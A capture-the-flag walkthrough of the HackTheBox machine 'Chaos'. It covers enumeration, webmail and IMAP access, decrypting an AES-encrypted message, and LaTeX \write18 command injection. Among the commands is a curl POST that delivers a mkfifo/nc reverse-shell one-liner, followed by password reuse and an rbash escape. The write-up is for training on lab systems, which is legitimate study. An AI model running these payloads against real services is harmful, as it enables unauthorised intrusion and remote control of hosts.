---
title: HTB: Chaos
url: https://0xdf.gitlab.io/2019/05/25/htb-chaos.html
date: 2019-05-25T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-chaos, ctf, hackthebox, nmap, webmin, gobuster, wordpress, wpscan, imap, openssl, roundcube, wfuzz, crypto, python, latex, pdftex, rbash, gtfobins, tar, password-reuse, firefox
---

![Chaos-cover](https://0xdfimages.gitlab.io/img/chaos-cover.png)

Choas provided a couple interesting aspects that I had not worked with before. After some web enumeration and password guessing, I found myself with webmail credentials, which I could use on a webmail domain or over IMAP to get access to the mailbox. In the mailbox was an encrypted message, that once broken, directed me to a secret url where I could exploit an instance of pdfTeX to get a shell. From there, I used a shared password to switch to another user, performed an restricted shell escape, and found the root password in the user’s firefox saved passwords. That password was actually for a Webmin instance, which I’ll exploit in Beyond Root.

## Box Info

| Name | [Chaos](https://hackthebox.com/machines/chaos)  [Chaos](https://hackthebox.com/machines/chaos) [Play on HackTheBox](https://hackthebox.com/machines/chaos) |
| --- | --- |
| Release Date | [15 Dec 2018](https://twitter.com/hackthebox_eu/status/1073142655633248256) |
| Retire Date | 11 May 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Chaos |
| Radar Graph | Radar chart for Chaos |
| First Blood User | 00:58:25[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| First Blood Root | 01:07:30[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [felamos felamos](https://app.hackthebox.com/users/27390) |

## Recon

### nmap

`nmap` shows two web ports (80 and 10000) as well as 4 ports associated with email, pop3 and imap (110, 143, 993, and 995):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.120

Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 19:41 EST
Nmap scan report for 10.10.10.120
Host is up (0.020s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds

root@kali# nmap -sV -sC -p 80,110,143,993,995,10000 -oA nmap/scripts 10.10.10.120                                                                                                                                              
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 19:41 EST
Nmap scan report for 10.10.10.120
Host is up (0.019s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE PIPELINING RESP-CODES STLS SASL TOP UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login listed ENABLE have LITERAL+ LOGIN-REFERRALS more capabilities ID OK LOGINDISABLEDA0001 SASL-IR IMAP4rev1 STARTTLS post-login IDLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login ENABLE have LITERAL+ LOGIN-REFERRALS more listed AUTH=PLAINA0001 capabilities OK SASL-IR IMAP4rev1 ID post-login IDLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE PIPELINING RESP-CODES USER SASL(PLAIN) TOP UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.20 seconds

```

### Webmin - TCP 10000

There’s a login page to a Webmin instance on port 10000:

![1557344484460](https://0xdfimages.gitlab.io/img/1557344484460.png)

I tried a few basic passwords like admin/admin and root/root, but didn’t get logged in. I’ll move on for now.

### Website - TCP 80

#### Site

If I try to just visit the ip address in a browser, I get:

![1545077588686](https://0xdfimages.gitlab.io/img/1545077588686.png)

Updating my hosts file by adding an entry for `chaos.htb` pointing to 10.10.10.120, and trying again, I get a site for a security company:

![1545077629168](https://0xdfimages.gitlab.io/img/1545077629168.png)

There’s a bunch of stuff to browse around, but nothing that ends up interesting in terms of progressing on this box.

#### gobuster

I’ll kick off `gobuster` to look for interesting paths. One thing to note, the ip and the hostname give different results, so it was easy to miss the `/wp` path if you just ran against the hostname and not the ip:

```

root@kali# gobuster -u http://chaos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js
                                          
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir               
[+] Url/Domain   : http://chaos.htb/                 
[+] Threads      : 10    
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html,js
[+] Timeout      : 10s
=====================================================
2018/12/15 19:46:08 Starting gobuster
=====================================================
/index.html (Status: 200)
/about.html (Status: 200)
/contact.html (Status: 200) 
/blog.html (Status: 200)                             
/img (Status: 301)          
/css (Status: 301)                                   
/source (Status: 301)
/js (Status: 301)
/javascript (Status: 301)                            
/hof.html (Status: 200)                              
/server-status (Status: 403)                         
=====================================================
2018/12/15 20:15:56 Finished                      
=====================================================

root@kali# gobuster -u http://10.10.10.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js,txt,html
[+] Timeout      : 10s
=====================================================
2018/12/17 08:22:52 Starting gobuster
=====================================================
/index.html (Status: 200)
/wp (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
=====================================================
2018/12/17 08:52:52 Finished
=====================================================

```

#### /wp/wordpress

At `/wp/`, there’s a page with dir lists enabled, showing a folder to `/wp/wordpress/`. There, I’ll find a WordPress site with a protected post:

![1545077797210](https://0xdfimages.gitlab.io/img/1545077797210.png)

Interestingly, if I click on the post and see the page that way, there’s one additional bit of information:

![1545077859469](https://0xdfimages.gitlab.io/img/1545077859469.png)

Running `wpscan` against the host will also reveal this username:

```

root@kali# wpscan --url http://10.10.10.120/wp/wordpress/ -e u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.5.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://10.10.10.120/wp/wordpress/
...[snip]...
[i] User(s) Identified:

[+] human
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.120/wp/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
...[snip]...

```

A bit of guessing reveals that the password is ‘human’:

![1545077983050](https://0xdfimages.gitlab.io/img/1545077983050.png)

The post provides a username and password for “webmail”.

### Webmail

#### Finding It

Given the hint that the host name mattered, I decided to use `wfuzz` to look for other domains:

```

root@kali# wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-110000.txt -u http://10.10.10.120/ -H 'Host: FUZZ.chaos.htb' --hh 73 --hc 400                                                                                           
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.120/
Total requests: 114532

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000005:  C=200    120 L      386 W         5607 Ch        "webmail"

Total time: 257.2371
Processed Requests: 114532
Filtered Requests: 114531
Requests/sec.: 445.2389

```

That seems to be what I’m looking for.

#### Site

Standard roundcube login page:

![1545078241634](https://0xdfimages.gitlab.io/img/1545078241634.png)

#### Logging In

After logging in, I see the mailbox is empty:

![1545078293047](https://0xdfimages.gitlab.io/img/1545078293047.png)

The drafts folder is not:

[![1545078339003](https://0xdfimages.gitlab.io/img/1545078339003.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1545078339003.png)

The message says:

> Hii, sahay
> Check the enmsg.txt
> You are the password XD.
> Also attached the script which i used to encrypt.
> Thanks,
> Ayush

There are two attachments: `enim_msg.txt` and `en.py`.

### IMAP

Rather than going into webmail, the same information can be retrieved using IMAP. [This reference](https://busylog.net/telnet-imap-commands-note/) has a good walkthrough of the various IMAP commands over `openssl`.

Connect with `openssl` and login:

```

root@kali# rlwrap openssl s_client -connect 10.10.10.120:993
CONNECTED(00000003)
...[snip]...
a LOGIN ayush jiujitsu
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

```

List all mailboxes:

```

a LIST "" "*"
* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\HasNoChildren) "/" INBOX
a OK List completed (0.002 + 0.000 + 0.001 secs).

```

If I go into INBOX or Sent, I’ll see both empty. I’ll go into Drafts:

```

a SELECT Drafts
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1540728611] UIDs valid
* OK [UIDNEXT 5] Predicted next UID
a OK [READ-WRITE] Select completed (0.001 + 0.000 secs).

```

Get the contents of the first (and only) message in the current folder:

```

a FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {2532}
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_00b34a28b9033c43ed09c0950f4176e1"
Date: Sun, 28 Oct 2018 17:46:38 +0530
From: ayush <ayush@localhost>
To: undisclosed-recipients:;
Subject: service
Message-ID: <7203426a8678788517ce8d28103461bd@webmail.chaos.htb>
X-Sender: ayush@localhost
User-Agent: Roundcube Webmail/1.3.8
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII;
 format=flowed

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: application/octet-stream;
 name=enim_msg.txt
Content-Disposition: attachment;
 filename=enim_msg.txt;
 size=272

MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=us-ascii;
 name=en.py
Content-Disposition: attachment;
 filename=en.py;
 size=804

ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK
--=_00b34a28b9033c43ed09c0950f4176e1--
)
a OK Fetch completed (0.001 + 0.000 secs).

```

I can base64-decode those blobs to get the attachments.

## Decrypt Message

### Overview

There are two files, `enim_msg.txt` and `en.py`. The first is binary, the encrypted message. The second is a python script:

```

  1 def encrypt(key, filename):
  2     chunksize = 64*1024
  3     outputFile = "en" + filename
  4     filesize = str(os.path.getsize(filename)).zfill(16)
  5     IV =Random.new().read(16)
  6 
  7     encryptor = AES.new(key, AES.MODE_CBC, IV)
  8 
  9     with open(filename, 'rb') as infile:
 10         with open(outputFile, 'wb') as outfile:
 11             outfile.write(filesize.encode('utf-8'))
 12             outfile.write(IV)
 13 
 14             while True:
 15                 chunk = infile.read(chunksize)
 16 
 17                 if len(chunk) == 0:
 18                     break
 19                 elif len(chunk) % 16 != 0:
 20                     chunk += b' ' * (16 - (len(chunk) % 16))
 21 
 22                 outfile.write(encryptor.encrypt(chunk))
 23 
 24 def getKey(password):
 25             hasher = SHA256.new(password.encode('utf-8'))
 26             return hasher.digest()

```

It seems reasonable to guess that the password is sahay, since the message said to sahay “you are the password”.

### Code Walkthrough

I’ll look at the `encrypt` function in this code to understand what it’s doing.
- Starts by setting up some variables [Lines 2-7]. The `outputFile` is the original filename prepended with “en”. I can guess that the original file name for my file was `im_msg.txt`. I’ll also see that `filesize` is a string that is zero filled to 16 bytes. Finally, there’s a 16 byte random initialization vector (IV), which is used to initialize an AES object.
- Open both the input and output files [9-10].
- Write the filesize string to outfile [11]. I can see that if I look at my encrypted message, it starts with the ascii string “0000000000000234”:

  ```

  root@kali# xxd enim_msg.txt
  00000000: 3030 3030 3030 3030 3030 3030 3032 3334  0000000000000234
  00000010: aeee aa7a 198a d8b3 704b 3885 5a43 83cc  ...z....pK8.ZC..
  ...[snip]...

  ```
- Writes the IV [12]. That is the next row of random bytes in the hexdump above.
- Loop over reading in chunks until it reaches an empty chunk [14-22]. If the chunk is not divisible by 16, pad with spaces to get it so. Encrypt the chunk and write it to the outfile.

The `getKey` function isn’t used in `encrypt`, but I can guess that it is used to take a plaintext password from the user and generate a key for the encryption (as key is an input to the function).

### Decryption

I’ll create a decryption function by basically reversing the order of things in `encrypt`.

#### Imports

To build this script, the first thing I did was get the imports so that that encryption would work. I added this line to the end of the script:

```

encrypt(getKey("sahay"), "en.py")

```

Then I ran it and fixed import errors until it work. In the end, I needed to import:

```

import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

```

#### Decryption

Now I’l simply mirror the encryption. First I’ll read the filesize and IV from the input file. Then I’ll read in a chunk, break if it’s empty, and otherwise decrypt and write the result. Once I reach the end, I’ll use `truncate` to remove the padding.

```

import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

def decrypt(key, filename):
    chunksize = 64*1024
    outfile = "de" + filename

    with open(filename, 'rb') as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outfile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(filesize)

decrypt(getKey("sahay"), "enim_msg.txt")

```

To be honest, I’m quite tempted to re-write this as a class, with nice user-friendly input and output. But I’ll leave that an exercise for the reader who wants to practice python.

### Alternative - Find the Source

I think it’s more interesting to see how this works, which is why I showed that first. But when I actually was working this machine, I came across [this GitHub script](https://raw.githubusercontent.com/mohamed1lar/Python-Scripts/master/crypto.py), which appears to be the full code from which the two functions were taken. I simply used it to decrypt, changing the encrypted file to `enim_msg.hacklab`:

```

root@kali# ./crypto.py -d enim_msg.hacklab -p sahay

                       |
                       |
                  -----+------        -----------
                       |                                   
                       |
            )                                           (
            \ \                                       / /
             \ |\                                   / |/
              \|  \           hack1lab            /   /
               \   |\         --------          / |  /
                \  |  \_______________________/   | /
                 \ |    |      |      |      |    |/
                  \|    |      |      |      |    /
                   \____|______|______|______|___/

                      By: @hacklab, @mohamed1lar
                  fb.me/hack1lab, fb.me/mohamed1lar

[+] Decrypting......
[+] removing file......

[+] Done

```

### Decrypted Message

Via either path, I have a textfile that is clearly base64 encoded:

```

root@kali# cat enim_msg
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK

root@kali# cat deenim_msg.txt 
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK

```

I’ll decode it and get the message:

```

root@kali# cat enim_msg | base64 -d
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush

```

## Shell as www-data

### PDF Service

Visiting the page shows a service in development:

![1557294242667](https://0xdfimages.gitlab.io/img/1557294242667.png)

On entering some text and hitting “Create PDF”, nothing happens.

### Page Source

I’ll take a look at the page source to see what’s happening. The HTML form is set to call a function, `senddata()` and return false:

```

<form onsubmit="senddata(); return false;">

```

This means that function is called, and then no further action is taken (no submit to new address, page load, etc).

At the bottom it imports jquery and bootstrap, and `app.js`:

```

        <script src="assets/js/jquery-1.11.3.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/app.js"></script>

```

`app.js` contains the `senddata()` function:

```

function senddata() {
	var content = $("#content").val();
	var template = $("#template").val();

	if(content == "") {
		$("#output").text("No input given!");
	}
	$.ajax({
		url: "ajax.php",
		data: {
			'content':content,
			'template':template
		},
		method: 'post'
	}).success(function(data) {
		$("#output").text(data)
	}).fail(function(data) {
		$("#output").text("OOps, something went wrong...\n"+data)
	})
	return false;
}

```

It checks that there’s content, and then sends a post to `ajax.php` with the content and template selected. It then updates the object with id output (`#output`) with the data that was returned. Back in the HTML, there is no field with id output, which is why nothing changes on submit.

### Watching Responses

I’ll switch over to Burp and see what’s happening with the request. It turns out there’s a lot to see. With `template=test1`, I get a log dump that results in failure to create a pdf:

```

HTTP/1.1 200 OK
Date: Wed, 08 May 2019 05:42:39 GMT
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3405
Connection: close
Content-Type: text/html; charset=UTF-8

LOG:
This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
 \write18 enabled.
entering extended mode
(./610b65e501077098bb1f9f20c8fb1f0b.tex
LaTeX2e <2018-04-01> patch level 5
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
Document Class: scrartcl 2018/03/30 v3.25 KOMA-Script document class (article)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty)))
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty))
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))
(/usr/share/texlive/texmf-dist/tex/latex/jknapltx/sans.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1cmss.fd))
(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.sty
(/usr/share/texlive/texmf-dist/tex/generic/babel/switch.def)
(/usr/share/texlive/texmf-dist/tex/generic/babel-english/english.ldf
(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.def
(/usr/share/texlive/texmf-dist/tex/generic/babel/txtbabel.def))))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
For additional information on amsmath, use the `?' option.
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amscls/amsthm.sty)
(/usr/share/texlive/texmf-dist/tex/latex/lipsum/lipsum.sty)
(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty)

Class scrartcl Warning: Usage of package `fancyhdr' together
(scrartcl)              with a KOMA-Script class is not recommended.
(scrartcl)              I'd suggest to use 
(scrartcl)              package `scrlayer' or `scrlayer-scrpage', because
(scrartcl)              they support KOMA-Script classes.
(scrartcl)              With `fancyhdr' several features of class `scrartcl'
(scrartcl)              like options `headsepline', `footsepline' or command
(scrartcl)              `\MakeMarkcase' and the commands `\setkomafont' and
(scrartcl)              `\addtokomafont' for the page style elements need
(scrartcl)              explicite user intervention to work.
(scrartcl)              Nevertheless, using requested
(scrartcl)              package `fancyhdr' on input line 34.

(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
No file 610b65e501077098bb1f9f20c8fb1f0b.aux.

LaTeX Font Warning: Font shape `T1/cmss/m/sc' in size <10.95> not available
(Font)              Font shape `T1/cmr/m/sc' tried instead on input line 69.

(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd) [1{/var/lib/texmf/fo
nts/map/pdftex/updmap/pdftex.map}] (./610b65e501077098bb1f9f20c8fb1f0b.aux) )
!pdfTeX error: /usr/bin/pdflatex (file ecss1095): Font ecss1095 at 600 not foun
d
 ==> Fatal error occurred, no output PDF file produced!

```

Templates 2 and 3 seem to succeed, as before the log I see something like:

```

FILE CREATED: 3934477b32304042a56afb99e01efd59.pdf
Download: http://chaos.htb/pdf/3934477b32304042a56afb99e01efd59.pdf

```

The pdf is not at the url given, but if I add the `J00_w1ll_f1Nd_n07H1n9_H3r3/` bit to the path, the document is there:

![1557299020775](https://0xdfimages.gitlab.io/img/1557299020775.png)

### LaTeX RCE

In the logs, I see a few interesting bits. The first line of the log is:

```

This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)

```

There’s also a reference to `LaTeX2e <2018-04-01> patch level 5`.

[This post](https://0day.work/hacking-with-latex/) goes into methods to exploit LaTeX if the `\write18` construct is enabled, which is referenced on the second line of the log output:

```

 \write18 enabled.

```

This construct allows writing to the 18th file descriptor, which by default is the command line. So if LaTeX is passed something of the following format, it will run the command:

```

\immediate\write18{[command]}

```

For example, the following POST gives me the `id` output (piped into `grep` to get rid of most of the output):

```

root@kali# curl -s -X POST -d "content=%5Cimmediate%5Cwrite18%7Bid%7D&template=test3" http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php | grep uid
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

From here, it’s pretty easy to get a shell:

```

root@kali# curl -X POST -d "content=%5Cimmediate%5Cwrite18%7Brm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.14 443 >/tmp/f%7D&template=test3" http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.120.
Ncat: Connection from 10.10.10.120:34222.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
chaos

```

## Privesc: www-data –> ayush

### su

In `/home` there are two users:

```

www-data@chaos:/home$ ls
ayush  sahay

```

Since I already had webmail creds for ayush (“jiujitsu”), I gave them a try with `su` (after upgrading my terminal using `python -c 'import pty;pty.spawn("bash")'`, then Ctrl-z, `stty raw -echo`, `fg`, `reset`), and they worked:

```

www-data@chaos:/home$ su ayush
Password: 
ayush@chaos:/home$ 

```

### rbash Escape

Unfortunately, ayush drops me into an `rbash` restricted shell:

```

ayush@chaos:/home$ cd ayush/
rbash: cd: restricted
ayush@chaos:/home$ echo $PATH
/home/ayush/.app
ayush@chaos:/home$ ls /home/ayush/.app/
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

```

I can hit `[tab][tab]` and get a list of commands I can run:

```

ayush@chaos:~$ 
!                         echo                      printf
./                        elif                      pushd
:                         else                      pwd
[                         enable                    read
[[                        esac                      readarray
]]                        eval                      readonly
{                         exec                      return
}                         exit                      select
alias                     export                    set
bg                        false                     shift
bind                      fc                        shopt
break                     fg                        source
builtin                   fi                        suspend
caller                    for                       tar
case                      function                  test
cd                        getopts                   then
command                   hash                      time
command_not_found_handle  help                      times
compgen                   history                   trap
complete                  if                        true
compopt                   in                        type
continue                  jobs                      typeset
coproc                    kill                      ulimit
declare                   let                       umask
dir                       local                     unalias
dirs                      logout                    unset
disown                    mapfile                   until
do                        ping                      wait
done                      popd                      while

```

